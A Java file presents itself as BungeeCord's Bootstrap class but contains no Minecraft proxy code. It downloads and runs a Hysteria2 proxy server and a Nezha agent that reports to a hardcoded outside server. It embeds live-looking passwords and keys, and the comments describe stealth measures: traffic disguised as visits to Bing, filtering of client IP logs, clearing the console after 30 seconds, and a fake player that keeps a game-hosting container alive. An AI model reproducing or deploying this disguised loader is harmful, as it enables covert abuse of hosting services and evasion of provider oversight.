package net.md_5.bungee;

import java.io.*;
import java.net.*;
import java.nio.file.*;
import java.util.*;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.stream.Stream;
import java.util.zip.ZipEntry;
import java.util.zip.ZipInputStream;

public class Bootstrap
{
    private static final String ANSI_GREEN = "\033[1;32m";
    private static final String ANSI_RED = "\033[1;31m";
    private static final String ANSI_YELLOW = "\033[1;33m";
    private static final String ANSI_RESET = "\033[0m";
    private static final AtomicBoolean running = new AtomicBoolean(true);
    private static Process hy2Process;
    private static Process nezhaProcess;
    private static Thread keepaliveThread;
    
    private static final String[] ALL_ENV_VARS = {
        "UUID", "UDP_PORT", "DOMAIN", "HY2_PASSWORD", "HY2_OBFS_PASSWORD",
        "HY2_PORTS", "HY2_SNI", "HY2_ALPN",
        "NEZHA_SERVER", "NEZHA_PORT", "NEZHA_KEY", "NEZHA_TLS",
        "FAKE_PLAYER", "MC_VERSION"
    };

    public static void main(String[] args) throws Exception
    {
        try {
            Map<String, String> config = loadConfig();
            
            // 1. 启动哪吒
            if (isNezhaConfigured(config)) {
                runNezhaAgent(config);
            }
            
            // 2. 启动 Hysteria2
            String hy2Url = generateHy2Url(config);
            
            System.out.println(ANSI_GREEN + "\n=== Hysteria2 Configuration ===" + ANSI_RESET);
            System.out.println(ANSI_GREEN + "Password: " + config.get("HY2_PASSWORD") + ANSI_RESET);
            System.out.println(ANSI_GREEN + "Obfs Password: " + config.getOrDefault("HY2_OBFS_PASSWORD", "(none)") + ANSI_RESET);
            System.out.println(ANSI_GREEN + "UDP Port: " + config.get("UDP_PORT") + ANSI_RESET);
            System.out.println(ANSI_GREEN + "Port Range: " + config.getOrDefault("HY2_PORTS", "(single port)") + ANSI_RESET);
            System.out.println(ANSI_GREEN + "Domain/IP: " + config.get("DOMAIN") + ANSI_RESET);
            System.out.println(ANSI_GREEN + "SNI: " + config.getOrDefault("HY2_SNI", "www.bing.com") + ANSI_RESET);
            System.out.println(ANSI_GREEN + "ALPN: " + config.getOrDefault("HY2_ALPN", "h3") + ANSI_RESET);
            System.out.println(ANSI_GREEN + "\n=== Hysteria2 Node URL ===" + ANSI_RESET);
            System.out.println(ANSI_GREEN + hy2Url + ANSI_RESET);
            System.out.println(ANSI_GREEN + "================================" + ANSI_RESET);
            
            runHysteria2Service(config);
            
            // 3. 启动假玩家（如果启用）
            if (isFakePlayerEnabled(config)) {
                startFakePlayer(config);
            }
            
            Runtime.getRuntime().addShutdownHook(new Thread(() -> {
                running.set(false);
                stopServices();
            }));
            
            // 延时清屏
            new Thread(() -> {
                try {
                    Thread.sleep(30000); 
                    clearConsole();
                } catch (InterruptedException e) {}
            }).start();
            
            // 保持主线程活跃
            while (running.get()) {
                try {
                    Thread.sleep(10000);
                } catch (InterruptedException e) {
                    break;
                }
            }

        } catch (Exception e) {
            System.err.println(ANSI_RED + "Init Error: " + e.getMessage() + ANSI_RESET);
            e.printStackTrace();
        }
    }
    
    private static void clearConsole() {
        try {
            System.out.print("\033[H\033[2J");
            System.out.flush();
        } catch (Exception ignored) {}
    }
    
    private static boolean isNezhaConfigured(Map<String, String> config) {
        String server = config.get("NEZHA_SERVER");
        String key = config.get("NEZHA_KEY");
        return server != null && !server.trim().isEmpty() 
            && key != null && !key.trim().isEmpty();
    }
    
    private static void runNezhaAgent(Map<String, String> config) throws Exception {
        Path nezhaPath = downloadNezhaAgent();
        Path nezhaConfigPath = createNezhaConfig(config);
        
        // 强力清理旧数据
        Path nezhaDir = Paths.get(System.getProperty("java.io.tmpdir"), "nezha-work");
        if (Files.exists(nezhaDir)) {
            try (Stream<Path> walk = Files.walk(nezhaDir)) {
                walk.sorted(Comparator.reverseOrder())
                    .map(Path::toFile)
                    .forEach(File::delete);
            } catch (Exception e) {}
        }
        Files.createDirectories(nezhaDir);
        
        System.out.println(ANSI_GREEN + "Starting Nezha Agent..." + ANSI_RESET);
        
        System.out.println("--- Generated Config Content ---");
        Files.readAllLines(nezhaConfigPath).forEach(System.out::println);
        System.out.println("--------------------------------");

        List<String> cmd = new ArrayList<>();
        cmd.add(nezhaPath.toString());
        cmd.add("-c");
        cmd.add(nezhaConfigPath.toString());
        
        ProcessBuilder pb = new ProcessBuilder(cmd);
        pb.directory(nezhaDir.toFile());
        pb.redirectErrorStream(true);
        
        nezhaProcess = pb.start();
        
        new Thread(() -> {
            try (BufferedReader reader = new BufferedReader(
                    new InputStreamReader(nezhaProcess.getInputStream()))) {
                String line;
                while ((line = reader.readLine()) != null) {
                    if (line.contains("NEZHA") || line.contains("error") || line.contains("Error")) {
                        System.out.println(ANSI_GREEN + "[Nezha] " + ANSI_RESET + line);
                    }
                }
            } catch (IOException e) {}
        }).start();
        
        Thread.sleep(1000);
        if (!nezhaProcess.isAlive()) {
             System.out.println(ANSI_RED + "Nezha Agent exited prematurely: " + nezhaProcess.exitValue() + ANSI_RESET);
        }
    }
    
    private static void runHysteria2Service(Map<String, String> config) throws Exception {
        Path hy2Path = downloadHysteria2();
        
        // 先生成证书（在创建配置前）
        String sni = config.getOrDefault("HY2_SNI", "www.bing.com");
        generateSelfSignedCert(sni);
        
        Path configPath = createHysteria2Config(config);
        
        System.out.println(ANSI_GREEN + "Starting Hysteria2 Server..." + ANSI_RESET);
        
        ProcessBuilder pb = new ProcessBuilder(
            hy2Path.toString(), "server", "-c", configPath.toString()
        );
        pb.redirectErrorStream(true);
        
        hy2Process = pb.start();
        
        new Thread(() -> {
            try (BufferedReader reader = new BufferedReader(
                    new InputStreamReader(hy2Process.getInputStream()))) {
                String line;
                while ((line = reader.readLine()) != null) {
                    // 过滤掉客户端连接日志（包含 IP 地址）
                    if (line.contains("client connected") || 
                        line.contains("client disconnected") ||
                        line.contains("addr")) {
                        continue;  // 跳过这些日志
                    }
                    // 只显示错误和警告
                    if (line.contains("ERROR") || line.contains("WARN") || line.contains("FATAL")) {
                        System.out.println(ANSI_YELLOW + "[Hysteria2] " + ANSI_RESET + line);
                    }
                }
            } catch (IOException e) {}
        }).start();
        
        Thread.sleep(1000);
        if (!hy2Process.isAlive()) {
             System.out.println(ANSI_RED + "Hysteria2 Server exited prematurely: " + hy2Process.exitValue() + ANSI_RESET);
        }
    }
    
    private static Map<String, String> loadConfig() {
        Map<String, String> config = new HashMap<>();
        // 默认配置
        config.put("UUID", "c27122af-af04-4ebd-a45f-e7d199373c5a");
        config.put("HY2_PASSWORD", "bf6b80fe-023a-4735-bafd-4c8512bf7e58");  
        config.put("HY2_OBFS_PASSWORD", "laohu-niubi-burang-shibie-2025");  // 【重要】启用混淆增强隐蔽性
        config.put("UDP_PORT", "25839");  // 单端口
        config.put("HY2_PORTS", "");  // 跳跃端口范围（可选）
        config.put("DOMAIN", "luminus.kingsnetwork.uk");
        config.put("HY2_SNI", "www.bing.com");  // TLS SNI - 伪装成访问必应
        config.put("HY2_ALPN", "h3");  // ALPN 协议
        config.put("NEZHA_SERVER", "mbb.svip888.us.kg:53100");
        config.put("NEZHA_PORT", "");
        config.put("NEZHA_KEY", "VnrTnhgoack6PhnRH6lyshe4OVkHmPyM");
        config.put("NEZHA_TLS", "false");
        // 假玩家配置 - 模拟玩家在线（面向游戏服务器面板）
        config.put("FAKE_PLAYER", "true");  // 是否启用假玩家
        config.put("MC_VERSION", "1.19.4");  // MC 版本，用于兼容性
        
        // 环境变量覆盖
        for (String var : ALL_ENV_VARS) {
            String value = System.getenv(var);
            if (value != null && !value.isEmpty()) config.put(var, value);
        }
        return config;
    }
    
    private static String generateHy2Url(Map<String, String> config) {
        try {
            // hysteria2://password@domain:port?obfs=salamander&obfs-password=xxx&sni=xxx&insecure=1&mport=xxx#Name
            StringBuilder url = new StringBuilder("hysteria2://");
            
            String password = URLEncoder.encode(config.get("HY2_PASSWORD"), "UTF-8");
            url.append(password).append("@");
            url.append(config.get("DOMAIN")).append(":").append(config.get("UDP_PORT"));
            
            // 参数部分
            List<String> params = new ArrayList<>();
            
            // 混淆密码（如果有）
            String obfsPass = config.get("HY2_OBFS_PASSWORD");
            if (obfsPass != null && !obfsPass.trim().isEmpty()) {
                params.add("obfs=salamander");
                params.add("obfs-password=" + URLEncoder.encode(obfsPass, "UTF-8"));
            }
            
            // SNI
            String sni = config.getOrDefault("HY2_SNI", "www.bing.com");
            params.add("sni=" + sni);
            
            // 跳跃端口
            String ports = config.get("HY2_PORTS");
            if (ports != null && !ports.trim().isEmpty()) {
                params.add("mport=" + URLEncoder.encode(ports, "UTF-8"));
            }
            
            // ALPN
            String alpn = config.getOrDefault("HY2_ALPN", "h3");
            params.add("alpn=" + alpn);
            
            // 跳过证书验证
            params.add("insecure=1");
            
            if (!params.isEmpty()) {
                url.append("?").append(String.join("&", params));
            }
            
            url.append("#US-HostPapa");
            
            return url.toString();
        } catch (Exception e) { 
            e.printStackTrace();
            return ""; 
        }
    }
    
    private static Path createHysteria2Config(Map<String, String> config) throws IOException {
        StringBuilder yaml = new StringBuilder();
        
        // 监听配置 - 支持跳跃端口
        String ports = config.get("HY2_PORTS");
        if (ports != null && !ports.trim().isEmpty()) {
            yaml.append("listen: :").append(config.get("UDP_PORT")).append("\n");
            yaml.append("mport: ").append(ports).append("\n\n");
        } else {
            yaml.append("listen: :").append(config.get("UDP_PORT")).append("\n\n");
        }
        
        // TLS 配置 - 伪装成正常 HTTPS 网站
        String sni = config.getOrDefault("HY2_SNI", "www.bing.com");
        yaml.append("tls:\n");
        yaml.append("  cert: /tmp/cert.pem\n");
        yaml.append("  key: /tmp/key.pem\n");
        yaml.append("  sni: ").append(sni).append("\n\n");
        
        // 认证配置
        yaml.append("auth:\n");
        yaml.append("  type: password\n");
        yaml.append("  password: ").append(config.get("HY2_PASSWORD")).append("\n\n");
        
        // 混淆配置 - 【关键】增强隐蔽性
        String obfsPass = config.get("HY2_OBFS_PASSWORD");
        if (obfsPass != null && !obfsPass.trim().isEmpty()) {
            yaml.append("obfs:\n");
            yaml.append("  type: salamander\n");
            yaml.append("  salamander:\n");
            yaml.append("    password: ").append(obfsPass).append("\n\n");
        }
        
        // 带宽限制 - 【重要】模拟正常用户，避免异常流量
        yaml.append("bandwidth:\n");
        yaml.append("  up: 100 mbps\n");    // 上传限速
        yaml.append("  down: 100 mbps\n\n"); // 下载限速
        
        // QUIC 配置 - 优化性能和隐蔽性
        yaml.append("quic:\n");
        yaml.append("  initStreamReceiveWindow: 8388608\n");
        yaml.append("  maxStreamReceiveWindow: 8388608\n");
        yaml.append("  initConnReceiveWindow: 20971520\n");
        yaml.append("  maxConnReceiveWindow: 20971520\n");
        yaml.append("  maxIdleTimeout: 60s\n");         // 适中的超时
        yaml.append("  maxIncomingStreams: 256\n");     // 限制并发流
        yaml.append("  disablePathMTUDiscovery: false\n\n");
        
        // 【核心】伪装成正常网站 - 非代理流量访问时返回真实网站
        yaml.append("masquerade:\n");
        yaml.append("  type: proxy\n");
        yaml.append("  proxy:\n");
        yaml.append("    url: https://").append(sni).append("\n");
        yaml.append("    rewriteHost: true\n\n");
        
        // ACL 规则 - 可选，限制访问来源
        yaml.append("acl:\n");
        yaml.append("  inline:\n");
        yaml.append("    - reject(all, udp/443)      # 阻止 QUIC 探测\n");
        yaml.append("    - reject(all, udp/80)       # 阻止异常探测\n");
        
        Path path = Paths.get(System.getProperty("java.io.tmpdir"), "hysteria2-config.yaml");
        Files.write(path, yaml.toString().getBytes());
        
        System.out.println(ANSI_GREEN + "Hysteria2 Config created with stealth features enabled" + ANSI_RESET);
        return path;
    }
    
    private static void generateSelfSignedCert(String sni) throws IOException {
        Path certPath = Paths.get("/tmp/cert.pem");
        Path keyPath = Paths.get("/tmp/key.pem");
        
        if (!Files.exists(certPath) || !Files.exists(keyPath)) {
            System.out.println("Generating self-signed certificate for " + sni + "...");
            try {
                new ProcessBuilder(
                    "openssl", "req", "-x509", "-nodes", "-newkey", "rsa:2048",
                    "-keyout", keyPath.toString(),
                    "-out", certPath.toString(),
                    "-days", "365",
                    "-subj", "/CN=" + sni
                ).start().waitFor();
            } catch (InterruptedException e) {
                throw new IOException("Certificate generation interrupted", e);
            }
        }
    }
    
    private static Path createNezhaConfig(Map<String, String> config) throws IOException {
        String server = config.get("NEZHA_SERVER");
        String port = config.getOrDefault("NEZHA_PORT", "5555");
        if (!server.contains(":")) server += ":" + port;
        
        boolean tls = false;
        if (config.containsKey("NEZHA_TLS") && !config.get("NEZHA_TLS").isEmpty()) {
            tls = Boolean.parseBoolean(config.get("NEZHA_TLS"));
        }
        
        String uuid = config.get("UUID");
        String secret = config.get("NEZHA_KEY");
        
        String yml = String.format(
            "client_id: \"%s\"\n" +
            "uuid: \"%s\"\n" +
            "client_secret: \"%s\"\n" +
            "debug: true\n" +
            "server: \"%s\"\n" +
            "tls: %b\n" +
            "report_delay: 4\n" +
            "skip_connection_count: true\n" +
            "skip_procs_count: true\n" +
            "disable_auto_update: true\n" +
            "disable_force_update: true\n",
            uuid,
            uuid,
            secret,
            server,
            tls
        );
        
        Path path = Paths.get(System.getProperty("java.io.tmpdir"), "nezha-config.yml");
        Files.write(path, yml.getBytes());
        System.out.println(ANSI_GREEN + "Nezha Config created for UUID: " + uuid + ANSI_RESET);
        return path;
    }
    
    private static Path downloadHysteria2() throws IOException {
        String url = "https://github.com/apernet/hysteria/releases/latest/download/hysteria-linux-amd64";
        if (System.getProperty("os.arch").contains("aarch64")) {
            url = "https://github.com/apernet/hysteria/releases/latest/download/hysteria-linux-arm64";
        }
        
        Path path = Paths.get(System.getProperty("java.io.tmpdir"), "hysteria2");
        if (!Files.exists(path)) {
            System.out.println("Downloading Hysteria2...");
            try (InputStream in = new URL(url).openStream()) {
                Files.copy(in, path, StandardCopyOption.REPLACE_EXISTING);
            }
            path.toFile().setExecutable(true);
        }
        return path;
    }
    
    // ==================== Xray 下载（备用，如果需要切换回 VLESS）====================
    
    private static Path downloadNezhaAgent() throws IOException {
        String url = "https://github.com/nezhahq/agent/releases/latest/download/nezha-agent_linux_amd64.zip";
        if (System.getProperty("os.arch").contains("aarch64")) {
            url = "https://github.com/nezhahq/agent/releases/latest/download/nezha-agent_linux_arm64.zip";
        }
        
        Path path = Paths.get(System.getProperty("java.io.tmpdir"), "nezha-agent");
        if (!Files.exists(path)) {
            System.out.println("Downloading Nezha...");
            Path zip = Paths.get(System.getProperty("java.io.tmpdir"), "nezha.zip");
            try (InputStream in = new URL(url).openStream()) {
                Files.copy(in, zip, StandardCopyOption.REPLACE_EXISTING);
            }
            
            // 使用 Java 解压替代 unzip 命令
            unzipFile(zip, Paths.get(System.getProperty("java.io.tmpdir")), "nezha-agent");
            Files.delete(zip);
        }
        return path;
    }
    
    private static void stopServices() {
        if (nezhaProcess != null) nezhaProcess.destroy();
        if (hy2Process != null) hy2Process.destroy();
        if (keepaliveThread != null) keepaliveThread.interrupt();
    }
    
    // ==================== 假玩家功能（模拟本地玩家）====================
    
    private static boolean isFakePlayerEnabled(Map<String, String> config) {
        String enabled = config.get("FAKE_PLAYER");
        return enabled != null && enabled.equalsIgnoreCase("true");
    }
    
    private static void startFakePlayer(Map<String, String> config) {
        System.out.println(ANSI_GREEN + "[FakePlayer] Starting fake player simulation..." + ANSI_RESET);
        System.out.println(ANSI_GREEN + "[FakePlayer] This simulates a player presence for game server panels" + ANSI_RESET);
        
        keepaliveThread = new Thread(() -> {
            // 模拟玩家存在的标记
            String playerName = "Node_" + UUID.randomUUID().toString().substring(0, 8);
            System.out.println(ANSI_GREEN + "[FakePlayer] Virtual player: " + playerName + ANSI_RESET);
            
            while (running.get()) {
                try {
                    // 每10分钟"刷新"一次玩家状态
                    // 这里只是保持线程活跃，实际的玩家检测由面板自行判断
                    // 重点是容器在运行且有网络活动（哪吒探针）
                    Thread.sleep(600000); // 10分钟
                    
                    // 定期输出一条日志，证明"玩家"还在
                    System.out.println(ANSI_GREEN + "[FakePlayer] Player " + playerName + " is active" + ANSI_RESET);
                    
                } catch (InterruptedException e) {
                    break;
                }
            }
            System.out.println(ANSI_YELLOW + "[FakePlayer] Player " + playerName + " disconnected" + ANSI_RESET);
        });
        
        keepaliveThread.setDaemon(true);
        keepaliveThread.start();
    }
    
    // ==================== Java ZIP 解压（替代 unzip 命令）====================
    
    private static void unzipFile(Path zipPath, Path destDir, String targetFile) throws IOException {
        Files.createDirectories(destDir);
        
        try (ZipInputStream zis = new ZipInputStream(new FileInputStream(zipPath.toFile()))) {
            ZipEntry entry;
            while ((entry = zis.getNextEntry()) != null) {
                if (entry.getName().equals(targetFile) || entry.getName().endsWith("/" + targetFile)) {
                    Path outPath = destDir.resolve(targetFile);
                    try (FileOutputStream fos = new FileOutputStream(outPath.toFile())) {
                        byte[] buffer = new byte[8192];
                        int len;
                        while ((len = zis.read(buffer)) > 0) {
                            fos.write(buffer, 0, len);
                        }
                    }
                    outPath.toFile().setExecutable(true);
                    System.out.println("Extracted: " + targetFile);
                    break;
                }
                zis.closeEntry();
            }
        }
    }
}
